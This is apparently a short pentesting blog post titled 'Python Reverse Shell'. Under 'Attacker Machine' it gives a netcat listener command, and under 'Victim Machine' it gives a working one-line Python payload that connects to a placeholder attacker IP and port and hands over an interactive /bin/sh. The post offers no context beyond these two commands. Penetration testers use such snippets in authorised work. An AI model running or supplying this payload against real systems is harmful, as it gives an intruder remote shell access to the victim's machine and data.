---
layout: post
title: "Python Reverse Shell"
tags: [python,reverse-shell,pentesting]
---

## Attacker Machine
```bash
nc -nvlp <$ATTACKER_PORT>
```

## Victim Machine
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<$ATTACKER_IP>",<$ATTACKER_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---
